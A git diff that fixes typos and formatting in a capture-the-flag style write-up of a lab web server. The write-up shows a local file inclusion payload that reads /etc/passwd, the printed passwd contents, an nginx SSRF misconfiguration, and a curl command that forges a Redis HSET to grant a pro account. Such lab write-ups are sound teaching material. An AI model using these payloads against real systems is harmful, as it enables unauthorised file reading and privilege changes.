@@ -144,45 +144,45 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
     ```
     -   `order.txt` contains all file names in the order in which the content is to be displayed on the blog page
     -   `file_get_contents($line)` outputs the content of each file within `order.txt`
--   This makes **LFI (Local file inclusion)** possible, but only if we do not have write access to the specified file, as we would otherwise overwrite it. The POST request after adding a new text field on the blog can be intercepted and manipulated with burpsuite. We can get the contents of the `/etc/passwd` by changing the POST parameters as follows:
+-   This makes **LFI (local file inclusion)** possible, but only if we do not have write access to the specified file, as we would otherwise overwrite it. The POST request after adding a new text field on the blog can be intercepted and manipulated with burpsuite. We can get the contents of the `/etc/passwd` by changing the POST parameters as follows:
     ```
     id=/etc/passwd&txt=test
     ```
-    - <details>
-        <summary>contents of /etc/passwd</summary>
-        
-        ```    
-        root:x:0:0:root:/root:/bin/bash
-        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-        bin:x:2:2:bin:/bin:/usr/sbin/nologin
-        sys:x:3:3:sys:/dev:/usr/sbin/nologin
-        sync:x:4:65534:sync:/bin:/bin/sync
-        games:x:5:60:games:/usr/games:/usr/sbin/nologin
-        man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-        proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-        backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-        list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-        irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
-        gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-        nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-        _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-        systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-        systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-        systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
-        systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
-        cooper:x:1000:1000::/home/cooper:/bin/bash
-        redis:x:103:33::/var/lib/redis:/usr/sbin/nologin
-        git:x:104:111:Git Version Control,,,:/home/git:/bin/bash
-        messagebus:x:105:112::/nonexistent:/usr/sbin/nologin
-        sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
-        _laurel:x:997:997::/var/log/laurel:/bin/false
-        ```
-        </details>
+    <details>
+    <summary>contents of <code>/etc/passwd</code></summary>
+
+    ```    
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    sync:x:4:65534:sync:/bin:/bin/sync
+    games:x:5:60:games:/usr/games:/usr/sbin/nologin
+    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+    systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+    systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+    systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
+    systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
+    cooper:x:1000:1000::/home/cooper:/bin/bash
+    redis:x:103:33::/var/lib/redis:/usr/sbin/nologin
+    git:x:104:111:Git Version Control,,,:/home/git:/bin/bash
+    messagebus:x:105:112::/nonexistent:/usr/sbin/nologin
+    sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+    _laurel:x:997:997::/var/log/laurel:/bin/false
+    ```
+    </details>
 - if we do have write permissions, we can also use this to create new files
 - The code shows that there are additional functions for so-called pro accounts. An additional `/uploads` directory is created for a blog of a pro user account, in which pro users are granted write permissions:
     ```php
@@ -306,18 +306,18 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
         ```
 
         </details>
-- the nginx configuration reveals a misconfiguration, which allows us access the Redis socket through **SSRF (Server-side request forgery)**:
+- the nginx configuration reveals a misconfiguration, which allows us access the Redis socket through **SSRF (server-side request forgery)**:
     ```yaml
-    	location ~ /static/(.*)/(.*) { 
-		resolver 127.0.0.1; 
-		proxy_pass http://$1.microbucket.htb/$2; 
+        location ~ /static/(.*)/(.*) { 
+	        resolver 127.0.0.1; 
+            proxy_pass http://$1.microbucket.htb/$2; 
 	}
     ```
     - we can exploit this, e.g. to upgrade a user account to a pro user account
 
 #### Exploitation
 
-1. After a user account (here: username `foo`) has been created, the **SSRF** vulnerability can be exploited to turn it into a pro user. To do this, we can send a forget [HSET request](https://redis.io/commands/hset/) to the Redis socket:
+1. After a user account (here: username `foo`) has been created, the **SSRF** vulnerability can be exploited to turn it into a pro user. To do this, we can send a forged [HSET request](https://redis.io/commands/hset/) to the Redis socket:
     ```bash
     curl -X "HSET" /static/unix:%2Fvar%2Frun%2Fredis%2Fredis%2Esock:foo%20pro%20true%20/
     ```
